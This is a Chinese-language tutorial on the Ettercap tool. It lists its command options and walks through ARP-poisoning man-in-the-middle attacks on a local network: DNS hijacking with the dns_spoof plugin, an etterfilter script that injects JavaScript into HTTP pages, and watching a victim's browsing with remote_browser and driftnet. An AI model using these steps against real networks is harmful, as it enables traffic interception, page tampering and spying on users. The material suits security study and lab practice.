# Ettercap的使用

## 常用指令

<table border="1">
    <tr>
        <th colspan="2">用户界面指令</th>
        <th colspan="2">通用选线项</th>
        <th colspan="2">日志选</th>
        <th colspan="2">嗅探与执行方式</th>
    </tr>
    <tr>
        <td>指令</td>
        <td>说明</td>
        <td>指令</td>
        <td>说明</td>
        <td>指令</td>
        <td>说明</td>
        <td>指令</td>
        <td>说明</td>
    </tr>
    <tr>
        <td>-T</td>
        <td>使用只显示字符</td>
        <td>-i</td>
        <td>使用网络接口</td>
        <td>-w</td>
        <td>将嗅探到的数据写入到pcap文件中量</td>
        <td>-M</td>
        <td>执行Mitm攻击</td>
    </tr>
    <tr>
        <td>-q</td>
        <td>安静模式，不显示抓到数据包的内容</td>
        <td>-l</td>
        <td>显示所有的网络接口</td>
        <td>-L</td>
        <td>此处计量所有流</td>
    </tr>
    <tr>
        <td>gt ></td>
        <td>大于</td>
        <td>-P</td>
        <td>开始该插件</td>
    </tr>
    <tr>
        <td>-G</td>
        <td>图形化启动</td>
        <td>-F</td>
        <td>加载过滤器</td>
    </tr>
</table>

## 案例

### DNS劫持

1. ettercap -G
2. 选择网络接口

![](Image\图像 2.png)

3. 扫描IP，打开IP列表

![图像 3](Image\图像 3.png)

4. 添加网关和攻击IP

![图像 18](Image\图像 4.png)

5. 在Mitm中选择arp攻击方式，勾选第一个选项

![图像 20](Image\图像 5.png)

6. 在Plugins中选择自带的插件dns_spoof

![图像 22](Image\图像 6.png)

7. 修改etter.dns配置文件

```
cd /etc/ettercap/etter.dns
leafpad etter.dns
```

![图像 19](Image\图像 7.png)


8. 开始攻击

### 访问网站弹框
1. 1-7和上面的一样
2. 找到可以让网站弹框脚本，保存为.filter文件

```
// 弹框脚本
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        pcre_regex(DATA.data, "(Accept-Encoding:).*([\r\n])", "$1 identity$2");
        msg("change encoding");
    }
}
if (ip.proto == TCP && tcp.src == 80) {
    if (search(DATA.data, "<head>")) {
        replace("<head>", "<head><script>alert('js inject')</script>");
        msg("inject head");
    }
}

```


3. 编译filter文件为ef文件

![图像 13](Image\图像 8.png)

4. 在Filters中选择导入编译好的ef文件

![图像 14](Image\图像 9.png)

5. 开始攻击



### 查看对方浏览器

1. 1-7相同
2. 在Plugins中选择自带的插件remote_browser

![图像 12](Image\图像 10.png)

3. 开始攻击
4. 如果想查看网站的图片


```
driftnet -i eth0
```
![图像 11](Image\图像 11.png)